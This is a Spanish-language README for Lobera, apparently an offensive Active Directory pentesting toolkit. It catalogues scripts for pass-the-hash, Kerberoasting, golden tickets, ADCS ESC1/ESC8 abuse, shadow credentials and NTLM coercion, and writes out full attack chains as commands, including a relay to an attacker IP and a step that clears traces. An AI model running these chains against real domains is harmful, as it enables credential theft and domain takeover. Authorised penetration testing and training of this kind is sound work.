<p align="center">
  <img src="docs/lobera_logo.png" alt="Lobera logo" width="220"/>
</p>

<h1 align="center">Lobera</h1>

<p align="center">
  <strong>Toolkit modular para pentesting de Active Directory</strong><br/>
  Construido sobre <code>impacket</code> — entiendes los protocolos, no solo las herramientas.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/protocolos-SMB%20·%20Kerberos%20·%20LDAP%20·%20RPC%20·%20WinRM%20·%20SSH%20·%20SSL%20·%20HTTP%20·%20FTP%20·%20MSSQL-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/estado-activo-green?style=flat-square"/>
</p>

---

> ⚠️ **Beta** — muchos scripts están en desarrollo activo. Si encuentras algún problema: 📧 mitr0kerb@gmail.com

---

## ¿Qué es Lobera?

Lobera es un toolkit modular para enumerar y atacar entornos Active Directory. Cada protocolo está implementado directamente sobre `impacket` — sin wrappers, sin magia negra. El objetivo es entender qué paquete va a qué puerto y por qué.

No es un clon de CrackMapExec. Cada llamada mapea a una operación real de protocolo.

---

## Instalación

```bash
git clone git@github.com:mitr0kerb/Lobera.git
cd Lobera
pip install -r requirements.txt --break-system-packages
python3 lobera.py
```

**Requisitos:** Python 3.10+, impacket, rich, pyfiglet, pycryptodomex, pyasn1, pywinrm.

---

## Tres modos de uso

### 1. Modo clásico — CLI directo

El más rápido. Todo son flags, sin prompts.

```bash
# Ver todos los scripts de un protocolo
python3 lobera.py smb

# Ver parámetros de un script
python3 lobera.py smb --script=null-session

# Ejecutar
python3 lobera.py smb --script=shares -t 10.10.10.5 -u iker -p Pass123!

# Ejecutar una familia entera
python3 lobera.py ldap --script-fam=enum -t 10.10.10.5 -d CORP.LOCAL -u iker -p Pass123!

# Simular sin ejecutar nada
python3 lobera.py smb --script=shares -t 10.10.10.5 -u iker -p Pass123! --dry-run
```

### 2. Shell interactivo — consola por protocolo

REPL persistente: establece los parámetros una vez y lanza varios scripts sin repetirlos.

```bash
python3 lobera.py smb --interactive-shell
python3 lobera.py kerberos --interactive-shell
```

```
smb-shell > load shares
smb-shell(shares) > set target 10.10.10.5
smb-shell(shares) > set user iker
smb-shell(shares) > run
smb-shell(shares) > load gpp-password
smb-shell(shares) > run    ← reutiliza target/user
```

### 3. Scanner autopwn — escaneo automático por fases

Ejecuta todos los scripts relevantes en orden, fase a fase, según las condiciones (¿tienes credenciales? ¿tienes un ccache?).

```bash
python3 lobera.py smb --scanner
python3 lobera.py ldap --scanner
python3 lobera.py kerberos --scanner
```

---

## Scripts disponibles

### SMB
| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `null-session` | Sesión nula — acceso sin credenciales |
| enum | `shares` | Enumera shares y permisos |
| enum | `users` | Enumera usuarios vía RID cycling |
| enum | `gpp-password` | Busca contraseñas en GPP/SYSVOL |
| enum | `lsa-secrets` | Extrae secretos LSA (requiere admin) |
| attack | `pass-the-hash` | Autenticación con hash NT |
| attack | `pass-the-ticket` | Autenticación con .ccache de Kerberos |

### Kerberos
| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `user-enum` | Enumera usuarios válidos (AS-REQ sin preauth) |
| extraction | `asreproast` | AS-REP Roasting — hashes sin preauth |
| extraction | `kerberoast` | Kerberoasting — hashes de cuentas con SPN |
| tickets | `overpass-the-hash` | NT hash → TGT (genera .ccache) |
| tickets | `pass-the-ticket` | Usa .ccache para autenticarse |
| tickets | `golden-ticket` | Genera Golden Ticket (requiere krbtgt hash) |
| tickets | `silver-ticket` | Genera Silver Ticket (requiere hash de servicio) |
| delegation | `unconstrained` | Detecta delegación no restringida |
| delegation | `constrained` | Detecta delegación restringida (S4U2Proxy) |
| delegation | `rbcd` | Resource-Based Constrained Delegation |

### LDAP
| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `domain-info` | Info general del dominio (política de contraseñas, nivel funcional) |
| enum | `users` | Enumera usuarios con flags UAC |
| enum | `groups` | Enumera grupos y miembros |
| enum | `dacl` | ACEs peligrosas (WriteDACL, GenericAll, etc.) |
| enum | `bloodhound-lite` | Enumeración completa en un solo paso + rutas de ataque |
| adcs | `enum-templates` | Detecta plantillas ADCS vulnerables (ESC1-ESC8) |
| adcs | `request-cert` | Solicita certificado con SAN arbitrario (ESC1) → .pfx |
| exploits | `shadow-creds` | Escribe msDS-KeyCredentialLink → TGT sin cambiar contraseña |
| exploits | `ntlm-relay-setup` | Verifica prerequisitos y genera comandos para NTLM Relay |

### RPC
| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `enum-dc` | Enumera Domain Controllers vía RPC |
| enum | `samr` | Enumera usuarios y grupos vía MS-SAMR |
| attack | `coerce` | PetitPotam / PrinterBug / DFSCoerce → fuerza autenticación NTLM |

### WinRM / SSH / FTP / MSSQL / HTTP / HTTPS / SSL
Cada protocolo tiene sus propias familias `enum`, `attack`, `exploit` y `post`. Ver `python3 lobera.py <protocolo>` para el listado completo.

---

## Flujos de ataque habituales

### Kerberoasting → crackeo offline
```bash
lobera.py kerberos --script=kerberoast -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
# → guarda hashes en session db
hashcat -m 13100 hashes.txt rockyou.txt
```

### ESC1 — Certificado como Administrador
```bash
# 1. Buscar plantilla vulnerable
lobera.py ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL

# 2. Solicitar certificado como Administrator
lobera.py ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --template VulnTemplate --upn administrator@corp.local --ca CORP-CA

# 3. Obtener TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

### Coerción + NTLM Relay → ADCS (ESC8)
```bash
# Terminal 1: preparar relay
lobera.py ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
  --mode adcs --ca CORP-CA --attacker-ip 10.10.14.1

# Terminal 2: coercionar al DC
lobera.py rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1

# → ntlmrelayx captura y redirige → cert.pfx como DC$
certipy auth -pfx dc.pfx -dc-ip 10.10.10.5   # → NT hash del DC → DCSync
```

### Shadow Credentials → TGT sin cambiar contraseña
```bash
# Requiere GenericWrite sobre el objeto
lobera.py ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --target-user victima

# → genera victima.pfx
certipy auth -pfx victima.pfx -dc-ip 10.10.10.5

# Limpiar rastro
lobera.py ldap --script=shadow-creds ... --target-user victima --clear
```

### BloodHound lite — mapa de ataque rápido
```bash
lobera.py ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
# → resumen de rutas críticas ordenadas por severidad sin levantar BloodHound
```

---

## Base de datos de sesión

Todos los hallazgos, credenciales y objetivos se guardan automáticamente en `lobera.db`.

```bash
python3 lobera.py db targets
python3 lobera.py db findings -t 10.10.10.5
python3 lobera.py db creds -t 10.10.10.5
python3 lobera.py db creds -t 10.10.10.5 --show-secret   # muestra secretos en claro
python3 lobera.py db delete -t 10.10.10.5
```

---

## Añadir scripts propios

Crea un fichero en `scripts/<protocolo>/<familia>/mi_script.py` y Lobera lo descubre automáticamente. Ver [`docs/como_añadir_scripts.md`](docs/como_añadir_scripts.md) para la plantilla completa y la referencia de objetos disponibles (`self.target`, `self.creds`, `session_db`).

---

## Autocompletado

```bash
# Bash
source tools/completions/lobera_completion.bash

# Zsh
source tools/completions/lobera_completion.zsh
```

---

## Plataformas

- Linux (Kali, Parrot) — principal
- macOS (Apple Silicon) — probado
- Windows — sin probar

---

## Aviso legal

Lobera es un proyecto personal educativo. Úsalo únicamente en sistemas propios o con permiso explícito por escrito. El uso no autorizado contra sistemas de terceros es ilegal.

---

**mitr0kerb** — construido como inmersión práctica en los protocolos de Active Directory.
Contacto: 📧 mitr0kerb@gmail.com
